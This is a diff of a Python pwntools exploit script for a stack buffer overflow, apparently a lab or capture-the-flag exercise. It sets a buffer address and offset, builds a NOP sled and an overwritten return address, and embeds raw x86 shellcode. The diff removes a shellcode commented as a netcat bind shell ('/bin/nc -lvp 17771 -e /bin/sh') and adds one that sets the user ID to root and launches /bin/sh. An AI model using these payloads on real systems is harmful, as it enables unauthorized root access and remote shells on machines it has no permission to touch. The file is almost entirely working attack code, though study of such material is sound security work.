@@ -1,29 +1,29 @@
 from pwn import p32
 import sys
 
-# buffer_start = 0xffffd0ed #default given
+
+# Update the following two variables with the correct values
 
 # buffer_start = 0xffffd05b #gdb
-# buffer_start = 0xffffd01b #direct run
-buffer_start =  0xffffd00b #application deployment run
+buffer_start = 0xffffd01b #direct run
 
 buffer_offset = 109
 
+# these dont need to be changed
 word_size = 4
 nop_sled_size = 15
 
-# /bin/nc -lvp 17771 -e /bin/sh
-shellcode = b"\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"
+# /bin/sh
+shellcode = b"\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
 
-# you may need to modify these values
 buffer_bytes = b'\x90' * (buffer_offset - 1)
 ebp_bytes = b'\x90' * word_size
 return_address = p32(buffer_start + buffer_offset + (2 * word_size))
 
-print(f"Return Address: {return_address}")
+# print(f"Return Address: {return_address}")
 
-numeric_return_address = buffer_start + buffer_offset + (2 * word_size)
-print(f"Return Address (hex): {hex(numeric_return_address)}")
+# numeric_return_address = buffer_start + buffer_offset + (2 * word_size)
+# print(f"Return Address (hex): {hex(numeric_return_address)}")
 
 nop_sled = b'\x90' * nop_sled_size
 
